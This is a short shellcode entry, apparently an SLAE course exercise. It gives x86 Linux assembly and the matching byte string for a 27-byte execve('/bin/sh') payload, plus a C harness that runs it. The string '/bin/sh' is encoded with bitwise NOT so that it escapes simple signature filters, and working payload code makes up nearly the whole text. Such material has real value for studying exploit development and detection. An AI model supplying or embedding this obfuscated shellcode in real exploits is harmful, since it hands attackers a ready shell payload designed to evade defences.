/*
; Title     : Execve /bin/sh Shellcode encoded with NOT
; Date      : May, 2018
; Author    : Nuno Freitas
; Twitter   : @nunof11
; SLAE ID   : SLAE-1112
; Size      : 27 bytes
; Tested on : i686 GNU/Linux

section .text

global _start

_start:
        xor ecx, ecx
	mul ecx
        push ecx

	; instructions to avoid having the strings "nib/" and "hs//" pushed directly
	mov edi, 0x978CD0D0
	mov esi, 0x91969DD0
	not edi
	not esi

	push edi
	push esi

        mov ebx, esp
        mov al, 0xb
        int 0x80
*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80";

void main()
{
	printf("Shellcode Length:  %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;
	ret();
}